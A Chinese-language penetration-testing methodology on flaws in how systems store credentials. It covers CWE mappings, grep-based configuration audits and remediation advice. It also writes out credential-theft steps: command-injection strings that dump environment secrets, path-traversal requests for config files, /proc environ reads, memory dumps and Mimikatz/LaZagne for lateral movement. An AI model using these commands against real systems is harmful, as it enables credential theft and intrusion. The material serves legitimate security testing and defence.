# 凭证存储设计缺陷攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的凭证存储设计缺陷检测与利用流程，帮助发现和利用系统在凭证存储设计层面的安全缺陷。

## 1.2 适用范围

本文档适用于所有需要存储认证凭证的系统，包括 Web 应用、移动应用、API 服务、配置文件、数据库等场景。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的安全人员。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

凭证存储设计缺陷是指系统在架构设计层面未对敏感凭证（密码、API 密钥、Token 等）进行适当保护，导致凭证以明文或弱保护形式存储。

**本质问题**：
- 架构设计未考虑凭证保护需求
- 未使用加密或哈希保护凭证
- 凭证存储位置设计不当
- 凭证生命周期管理设计缺失

### 与实现缺陷的区别

| 方面 | 设计缺陷 | 实现缺陷 |
|-----|---------|---------|
| 根源 | 架构设计缺失 | 代码实现错误 |
| 修复 | 需要重新设计 | 修复代码逻辑 |
| 检测 | 需要理解架构 | 可直接测试 |

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-256 | 密码明文存储 |
| CWE-522 | 凭证保护不足 |
| CWE-260 | 配置文件中的密码 |
| CWE-311 | 缺少敏感数据加密 |
| CWE-312 | 明文存储敏感信息 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 数据库连接 | 连接字符串配置 | 数据库密码明文存储 |
| LDAP 集成 | 目录服务认证 | LDAP 绑定密码明文 |
| API 集成 | 第三方 API 调用 | API 密钥明文存储 |
| 邮件服务 | SMTP 配置 | 邮件服务器密码 |
| 云服务 | 云资源访问凭证 | Access Key/Secret Key |
| 加密系统 | 加密密钥管理 | 主密钥明文存储 |
| 备份系统 | 备份服务认证 | 备份服务密码 |
| 监控系统 | 监控 agent 认证 | 监控凭证 |

## 2.3 漏洞发现方法

### 2.3.1 配置文件审计

**步骤 1：定位配置文件**

```bash
# 常见配置文件位置
# Java 应用
config.properties
application.yml
application.properties
web.xml

# .NET 应用
web.config
appsettings.json

# Node.js 应用
config.js
.env
config.json

# Python 应用
config.py
settings.py
.env
```

**步骤 2：搜索凭证模式**

```bash
# 搜索常见凭证模式
grep -ri "password" . --include="*.properties" --include="*.yml" --include="*.json"
grep -ri "passwd" . --include="*.conf" --include="*.cfg"
grep -ri "secret" . --include="*.env" --include="*.js"
grep -ri "api_key\|apikey" . --include="*.json" --include="*.yml"
grep -ri "token" . --include="*.env" --include="*.config"
```

**步骤 3：识别明文凭证特征**

```
明文凭证特征：
- password=admin123
- pwd=SuperSecret!
- secret_key=sk-1234567890
- api_key=ak_xxxxxxxxxx

弱编码凭证特征（无效缓解）：
- password=YWRtaW4xMjM=  (Base64)
- secret=7d865e959b246691  (简单哈希)
```

### 2.3.2 注册表检查（Windows）

```bash
# 检查 Windows 注册表中的凭证
reg query HKLM\SOFTWARE /s | findstr /i "password"
reg query HKCU\SOFTWARE /s | findstr /i "password"
```

### 2.3.3 内存凭证检测

```
检测点：
- 凭证使用后是否从内存清除
- 日志中是否记录凭证
- 错误消息是否泄露凭证
- 调试信息是否包含凭证
```

### 2.3.4 代码审计

**敏感代码模式检测**

```java
// ❌ 危险模式：明文密码
String password = "admin123";
Properties props = new Properties();
props.setProperty("password", password);

// ❌ 危险模式：配置文件读取明文
String dbPassword = config.getProperty("db.password");

// ❌ 危险模式：硬编码凭证
Connection conn = DriverManager.getConnection(
    "jdbc:mysql://localhost:3306/db?user=root&password=admin123"
);
```

## 2.4 漏洞利用方法

### 2.4.1 配置文件读取攻击

```bash
# 场景：获取数据库连接凭证

# 1. 定位配置文件
find /var/www -name "*.properties" -o -name "*.yml" -o -name "*.config"

# 2. 读取配置内容
cat /var/www/app/config/database.properties

# 3. 提取凭证
# db.username=admin
# db.password=SuperSecret123!

# 4. 使用凭证连接数据库
mysql -h localhost -u admin -pSuperSecret123!
```

### 2.4.2 环境变量窃取

```bash
# 场景：凭证存储在环境变量

# 1. 读取/proc 文件系统（Linux）
cat /proc/self/environ
cat /proc/[pid]/environ

# 2. 通过命令注入读取
; env | grep -i password
; printenv | grep -i secret

# 3. 通过 SSRF 读取（某些环境）
# 访问 file:///proc/self/environ
```

### 2.4.3 注册表凭证提取（Windows）

```bash
# 场景：Windows 服务存储凭证

# 1. 查询注册表中的密码
reg query "HKLM\SOFTWARE\Vendor" /v Password

# 2. 提取并解密（如果是弱加密）
# 使用工具如 Mimikatz、LaZagne

# 3. 使用凭证进行横向移动
```

### 2.4.4 内存凭证窃取

```bash
# 场景：凭证在内存中未清除

# 1. 内存转储
# Linux: gcore [pid]
# Windows: Procdump -ma [pid]

# 2. 分析内存转储
strings dump.core | grep -i password
strings dump.core | grep -i secret

# 3. 提取有效凭证
```

### 2.4.5 日志凭证提取

```bash
# 场景：凭证被记录到日志

# 1. 搜索日志文件
grep -ri "password" /var/log/
grep -ri "passwd" /var/log/

# 2. 查找调试日志
# 可能包含完整请求/响应

# 3. 提取有效凭证
```

### 2.4.6 利用链构建

```
典型攻击链：

文件读取漏洞 → 获取 config.properties → 提取数据库密码
    ↓
连接数据库 → 读取用户表 → 获取用户凭证
    ↓
横向移动 → 访问其他系统 → 权限提升
```

## 2.5 漏洞利用绕过方法

### 2.5.1 弱加密绕过

**Base64 解码**

```bash
# Base64 编码（非加密，可轻易解码）
echo "YWRtaW4xMjM=" | base64 -d
# 输出：admin123
```

**简单替换密码**

```python
# 某些应用使用简单替换
# 尝试常见模式：
# - 反转字符串
# - ROT13
# - 简单 XOR
```

### 2.5.2 配置文件访问绕过

**技巧 1：路径遍历读取**

```bash
# 通过路径遍历读取配置文件
GET /download?file=../../config/database.properties

# URL 编码绕过
GET /download?file=%2e%2e%2f%2e%2e%2fconfig%2fdb.properties
```

**技巧 2：备份文件读取**

```bash
# 读取配置备份文件
config.properties.bak
config.properties.old
config.properties~
database.yml.backup
```

**技巧 3：版本控制文件读取**

```bash
# 读取.git 目录
/.git/config
/.git/HEAD

# 读取 SVN 目录
/.svn/entries
```

### 2.5.3 凭证重用攻击

```
场景：获取凭证后的横向移动

1. 数据库凭证 → 连接数据库 → 数据泄露
2. API 密钥 → 调用 API → 未授权操作
3. 服务凭证 → 访问服务 → 权限提升
4. 管理员凭证 → 登录后台 → 完全控制
```

---

# 第三部分：附录

## 3.1 凭证存储测试检查清单

```
□ 检查配置文件中的明文密码
□ 检查注册表中的凭证存储
□ 检查环境变量中的敏感数据
□ 检查日志中的凭证泄露
□ 检查内存中的凭证残留
□ 检查错误消息中的凭证泄露
□ 检查版本控制中的凭证
□ 检查备份文件中的凭证
□ 检查代码中的硬编码凭证
□ 检查连接字符串中的凭证
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| LaZagne | 凭证提取 | https://github.com/AlessandroZ/LaZagne |
| Mimikatz | Windows 凭证提取 | https://github.com/gentilkiwi/mimikatz |
| TruffleHog | Git 历史凭证扫描 | https://github.com/dxa4481/truffleHog |
| Gitleaks | Git 仓库凭证扫描 | https://github.com/zricethezav/gitleaks |
| Burp Suite | Web 应用测试 | https://portswigger.net/burp |

## 3.3 修复建议

### 架构设计层面

1. **凭证保险库** - 使用 HashiCorp Vault、AWS Secrets Manager 等
2. **密钥管理系统** - 使用 KMS 管理加密密钥
3. **动态凭证** - 使用短期凭证而非长期凭证
4. **凭证轮换** - 定期自动轮换凭证

### 实现层面

1. **加密存储** - 使用强加密算法（AES-256）
2. **密码哈希** - 使用 bcrypt、Argon2 存储密码
3. **内存清理** - 凭证使用后及时从内存清除
4. **访问控制** - 限制配置文件的访问权限

### 运维层面

1. **权限最小化** - 配置文件仅允许必要用户读取
2. **审计日志** - 记录凭证访问行为
3. **监控告警** - 监控异常凭证使用
4. **定期审查** - 定期审查凭证存储安全

---

**参考资源**：
- [CWE-256: Plaintext Storage of a Password](https://cwe.mitre.org/data/definitions/256.html)
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [OWASP Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [NIST SP 800-63B: Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
